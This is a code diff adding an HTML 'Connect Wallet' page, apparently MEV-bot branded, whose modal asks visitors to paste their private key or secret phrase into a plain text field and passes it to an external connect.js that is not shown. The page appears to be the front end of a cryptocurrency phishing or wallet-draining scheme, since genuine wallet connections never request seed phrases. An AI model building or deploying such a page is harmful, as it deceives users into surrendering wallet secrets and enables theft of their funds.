@@ -1,0 +1,88 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="mev.png" type="image/x-icon">
+    <title>Connect Wallet</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.6.0/ethers.umd.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        button {
+            background-color: #008cba;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #005f73;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            margin: 15% auto;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .close {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .status {
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Connect Your Wallet</h2>
+    <button onclick="selectBlockchain('solana')">Connect Solana Wallet</button>
+    <!-- <button onclick="selectBlockchain('ethereum')">Connect Ethereum Wallet</button> -->
+    <button onclick="selectBlockchain('secret_phrase')">Use Secret Phrase</button>
+
+    <!-- Pop-up Modal -->
+    <div id="inputModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h3>Enter Your Private Key or Secret Phrase</h3>
+            <input type="text" id="walletInput" placeholder="Paste here" style="width: 100%; padding: 8px; margin-top: 10px;">
+            <button onclick="validateWallet()">Connect</button>
+            <p id="walletStatus" class="status"></p>
+        </div>
+    </div>
+
+    <script src="connect.js"></script>
+
+</body>
+</html>
